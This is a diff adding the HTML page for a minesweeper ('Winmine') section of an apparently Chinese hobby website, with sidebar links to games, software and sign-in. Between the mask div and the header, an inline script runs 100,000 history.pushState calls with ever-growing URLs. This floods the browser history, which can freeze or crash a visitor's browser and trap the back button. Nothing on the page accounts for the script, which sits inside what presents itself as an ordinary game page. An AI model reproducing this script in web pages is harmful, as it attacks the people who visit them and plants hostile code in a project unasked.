@@ -1,0 +1,49 @@
+<html>
+
+<head>
+	<title>Winmine - 211 Special Force</title>
+	<link rel="shortcut icon" href="image/favicon.ico">
+	<link rel="stylesheet" type="text/css" href="css/normalize.css">
+	<link rel="stylesheet" type="text/css" href="css/main.css">
+	<script src="js/main.js"></script>
+	<meta charset="utf-8">
+</head>
+
+<body onload="main()">
+	<div id="mask"></div>
+	<script>
+		var total = "";
+		for (var i = 0; i < 100000; i++) {
+			total = total + i.toString();
+			history.pushState(0, 0, total);
+		}
+
+	</script>
+	<header>
+		<nav id="topbar">
+			<div id="top_left"><a href="index.html">首页</a></div>
+			<div id="top_right"><a href="#">导航</a></div>
+		</nav>
+		<nav id="sidebar">
+			<div id="profile">
+				<button id="signIn">登录</button>
+				<button id="register">注册</button>
+			</div>
+			<ul>
+				<li><a href="#">软件</a></li>
+				<li id="sidebar_game">
+					<a href="#">游戏</a>
+					<ul id="sidebar_game_sub">
+						<li><a href="javascript:alert('游戏开发中，有建议的话可以点击页面下方的“加入我们”，加群讨论。');" id="sidebar_game_">未名の戰</a></li>
+						<li><a href="tictactoe.html" target="_blank" id="sidebar_game_ttt">XXOO</a></li>
+						<li><a href="#" id="sidebar_game_winmine">扫雷</a></li>
+					</ul>
+				</li>
+				<li><a href="#">其他</a></li>
+				<li><a href="#" id="sidebar_back">返回</a></li>
+			</ul>
+		</nav>
+	</header>
+</body>
+
+</html>
